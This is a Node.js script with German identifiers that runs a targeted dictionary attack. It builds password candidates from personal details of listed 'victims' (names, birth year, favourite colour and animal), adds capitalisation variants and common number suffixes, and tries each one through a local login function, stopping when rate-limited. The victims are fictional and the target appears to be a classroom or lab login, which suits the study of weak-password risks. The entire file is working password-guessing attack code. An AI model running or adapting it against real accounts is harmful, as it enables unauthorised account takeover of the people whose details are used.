"use strict";

const {login} = require("./login");

const haeufigeZusaetze = ["", "1", "123", "!", "2010", "2024", "99", "2023", "2022", "2021", "2020", "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009"];

const opferDaten = [
    {
        username: "sonic",
        daten: {
            vorname: "Sonic",
            nachname: "Hedgehog",
            geburtsjahr: "1991",
            lieblingsfarbe: "blau",
            lieblingstier: "Igel",
        }
    },
    {
        username: "amy",
        daten: {
            vorname: "Amy",
            nachname: "Rose",
            geburtsjahr: "1992",
            lieblingsfarbe: "pink",
            lieblingstier: "Igel",
            lieblingsPerson: "Sonic",
        }
    },
    {
        username: "max",
        daten: {
            vorname: "Max",
            nachname: "Mustermann",
            geburtsjahr: "1990",
            lieblingsfarbe: "grün",
            lieblingstier: "Hund",
        }
    },
    {
        username: "anna",
        daten: {
            vorname: "Anna",
            nachname: "Musterfrau",
            geburtsjahr: "1995",
            lieblingsfarbe: "rot",
            lieblingstier: "Katze",
        }
    },
    {
        username: "admin",
        daten: {
            vorname: "Admin",
            nachname: "User",
            geburtsjahr: "1980",
            lieblingsfarbe: "schwarz",
            lieblingstier: "Drache",
        }
    }
]

function kapitalisierungsVarianten(wort) {
  return [
      wort,
      wort.charAt(0).toUpperCase() + wort.slice(1),
      wort.toLowerCase(),
      wort.toUpperCase()
  ]
}

function erzeugeKandidaten(daten, zusaetze) {
  const bausteine = Object.values(daten).filter(Boolean);
  const kandidaten = new Set();

  for (const wort of bausteine) {
    const varianten = kapitalisierungsVarianten(wort);
    for (const variante of varianten) {
      for (const zusatz of zusaetze) {
        kandidaten.add(variante + zusatz);
      }
    }
  }

  for (const wort1 of bausteine) {
    for (const wort2 of bausteine) {
      if (wort1 !== wort2) {
        const varianten1 = kapitalisierungsVarianten(wort1);
        const varianten2 = kapitalisierungsVarianten(wort2);
        for (const variante1 of varianten1) {
          for (const variante2 of varianten2) {
            for (const zusatz of zusaetze) {
              kandidaten.add(variante1 + variante2 + zusatz);
            }
          }
        }
      }
    }
  }

  return [...kandidaten];
}

async function dictionaryAngriff(nutzer, kandidaten) {
  let versuche = 0;

  for (const kandidat of kandidaten) {
    versuche++;

    try {
        if (await login(nutzer, kandidat)) {
            return {gefunden: kandidat, versuche};
        }
    } catch (err) {
        if (err.message.includes("Rate limit exceeded")) {
            console.error("Rate limit exceeded. Please try again later.");
            process.exit(1);
        }
        throw err
    }
  }

  return { gefunden: null, versuche };
}

async function main() {
    for (const opfer of opferDaten) {
        const nutzer = opfer.username;
        const kandidaten = erzeugeKandidaten(opfer.daten, haeufigeZusaetze);
        console.log(`\nAngriffsziel:        username="${nutzer}"`);
        console.log(`Erzeugte Kandidaten: ${kandidaten.length}`);

        const start = Date.now();
        const { gefunden, versuche } = await dictionaryAngriff(nutzer, kandidaten);
        const dauerSekunden = (Date.now() - start) / 1000;

        console.log(`Passwort gefunden:   ${gefunden}`);
        console.log(`Anzahl Versuche:     ${versuche}`);
        console.log(`Dauer:               ${dauerSekunden.toFixed(3)} Sekunden`);
    }
}

if (require.main === module) {
  main();
}

